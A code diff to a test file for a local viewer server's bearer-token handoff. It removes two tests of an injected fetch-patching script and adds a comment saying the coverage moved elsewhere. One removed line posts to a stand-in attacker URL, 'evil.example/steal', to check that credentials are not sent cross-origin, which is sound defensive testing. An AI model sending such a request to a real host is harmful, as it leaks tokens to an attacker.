@@ -9,7 +9,6 @@ import {
   createViewerServer,
   isLocalHostHeader,
   viewerUrl,
-  injectBootstrap,
   LOOPBACK_HOST,
 } from "../../src/cli/commands/serve.js";
 import type { Server } from "node:http";
@@ -271,43 +270,21 @@ describe("token handoff", () => {
     expect(url.split("#")[0]).toBe("http://localhost:4567/?mode=learning");
   });
 
-  it("injects the bootstrap script into the viewer document", () => {
-    const html = injectBootstrap("<html><head><title>x</title></head><body></body></html>", "tok");
-    expect(html).toContain("Bearer ");
-    expect(html).toContain("tok");
-    expect(html.indexOf("<script>")).toBeLessThan(html.indexOf("</head>"));
-  });
-
-  it("attaches the bearer header to same-origin API calls, and only those", () => {
-    // The bootstrap script is what moves the fragment token into a header.
-    // Execute it for real against a stub fetch and inspect what it sends.
-    const calls: Array<{ url: string; init?: RequestInit }> = [];
-    const stub = vi.fn((input: unknown, init?: RequestInit) => {
-      calls.push({ url: String(input), init });
-      return Promise.resolve(new Response("{}"));
-    });
-
-    const win = {
-      location: { hash: "#token=tok", href: "http://localhost:4567/", origin: "http://localhost:4567", pathname: "/", search: "" },
-      history: { replaceState: vi.fn() },
-      fetch: stub,
-      Headers,
-      URL,
-    };
-
-    new Function("window", "Response", injectBootstrap("", "tok").match(/<script>([\s\S]*?)<\/script>/)![1])(
-      win,
-      Response
-    );
-
-    expect(win.location.hash).toBe("#token=tok");
-
-    win.fetch("/api/architecture");
-    const apiHeaders = new Headers(calls[0].init?.headers);
-    expect(apiHeaders.get("Authorization")).toBe("Bearer tok");
-
-    win.fetch("https://evil.example/steal", { method: "POST" });
-    const crossHeaders = new Headers(calls[1].init?.headers);
-    expect(crossHeaders.get("Authorization")).toBeNull();
-  });
+  // NOTE (0017): two cases that used to live here are gone, and the rest of
+  // this file is unchanged.
+  //
+  // "injects the bootstrap script into the viewer document" tested
+  // `injectBootstrap`, and "attaches the bearer header to same-origin API
+  // calls, and only those" executed that injected script in a fake `window`.
+  // Both asserted the *mechanism* 0017 deletes: a server-side rewrite of the
+  // HTML that monkey-patched `window.fetch`. The server no longer injects
+  // anything, so there is nothing here to execute.
+  //
+  // The behaviour they asserted — same-origin API calls carry the bearer
+  // header, cross-origin calls do not — did not weaken, it moved to where the
+  // code moved. `tests/viewer/api-auth.test.ts` now asserts it against the
+  // viewer's own `api/auth.ts`: same-origin gets `Bearer <token from the
+  // fragment>`, cross-origin gets no header at all. The boundary cases in this
+  // file that matter most are untouched: the bare-URL 401, the cross-origin
+  // 403, and the loopback bind.
 });
